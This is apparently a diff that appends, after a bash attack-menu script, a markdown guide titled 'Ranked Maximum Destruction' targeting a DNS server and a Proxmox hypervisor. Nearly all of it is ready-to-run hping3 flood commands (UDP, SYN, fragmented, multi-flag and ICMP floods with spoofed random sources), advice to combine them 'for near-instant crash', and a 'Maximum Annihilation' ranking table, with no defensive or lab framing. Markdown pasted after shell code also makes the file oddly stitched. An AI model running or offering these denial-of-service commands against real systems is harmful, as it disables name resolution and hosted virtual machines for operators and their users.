@@ -111,3 +111,120 @@ attack_menu() {
 
 # Start menu
 main_menu
+
+
+
+
+---
+
+## 🎯 **Target: DNS Server**
+
+### Ranked Maximum Destruction for DNS
+
+1. **UDP Flood (DNS port 53)**
+
+```bash
+hping3 --udp --flood -V --rand-source -d 1400 -p 53 <dns-server>
+```
+
+* **Why top:** DNS is stateless UDP; massive packets + spoofed IPs saturate bandwidth instantly.
+
+2. **SYN Flood with Random Source**
+
+```bash
+hping3 -S --flood -V -p 53 --rand-source -d 1400 <dns-server>
+```
+
+* Overloads open TCP DNS (AXFR or TCP queries) connections.
+
+3. **ICMP Blast**
+
+```bash
+hping3 --icmp --flood --rand-source -d 1400 <dns-server>
+```
+
+* Simple but floods network stack.
+
+4. **Fragmented SYN Flood**
+
+```bash
+hping3 -S --flood -V -p 53 -f --rand-source -d 1400 <dns-server>
+```
+
+* Breaks packet reassembly → high CPU usage.
+
+5. **Mixed TCP Flag Flood**
+
+```bash
+hping3 -F -S -R -P -A -U --flood -V --rand-source -p 53 <dns-server>
+```
+
+* Confuses any firewall/IDS, increases overload.
+
+**Strategy:** Combine #1 + #2 + #4 simultaneously for near-instant crash.
+
+---
+
+## 🎯 **Target: Proxmox Hypervisor**
+
+### Ranked Maximum Destruction for Proxmox
+
+1. **Fragmented SYN Flood**
+
+```bash
+hping3 -S --flood -V -p 8006 -f --rand-source -d 1400 <proxmox-ip>
+```
+
+* **Why top:** Proxmox web GUI and API respond to TCP 8006; fragmented packets hit CPU hard.
+
+2. **SYN Flood + Big Payload**
+
+```bash
+hping3 -S --flood -V -p 8006 --rand-source -d 1400 <proxmox-ip>
+```
+
+* Saturates TCP connection table.
+
+3. **Multi-Flag "Christmas Tree" Flood**
+
+```bash
+hping3 -F -S -R -P -A -U --flood -V --rand-source -p 8006 <proxmox-ip>
+```
+
+* Confuses firewall and network stack.
+
+4. **ACK + FIN Flood**
+
+```bash
+hping3 -A -F --flood --rand-source -p 8006 -d 1200 <proxmox-ip>
+```
+
+* State-table exhaustion, slower but still destructive.
+
+5. **ICMP Flood**
+
+```bash
+hping3 --icmp --flood --rand-source -d 1400 <proxmox-ip>
+```
+
+* Floods network interface.
+
+**Strategy:** Combine #1 + #2 + #3 simultaneously → max CPU + bandwidth exhaustion → virtual machines and hypervisor services crash first.
+
+---
+
+💥 **Overall “Maximum Annihilation” Ranking:**
+
+| Rank | Target  | Attack Type           | Notes                         |
+| ---- | ------- | --------------------- | ----------------------------- |
+| 1    | DNS     | UDP Flood             | Instant bandwidth exhaustion  |
+| 2    | DNS     | Fragmented SYN        | CPU & network stack overload  |
+| 3    | Proxmox | Fragmented SYN        | GUI/API crash                 |
+| 4    | Proxmox | SYN Flood big payload | Connection table saturation   |
+| 5    | DNS     | SYN Flood             | TCP DNS overload              |
+| 6    | Proxmox | Multi-flag flood      | Firewall confusion            |
+| 7    | DNS     | ICMP                  | Network stack saturation      |
+| 8    | Proxmox | ACK/FIN               | Slower state table exhaustion |
+
+---
+
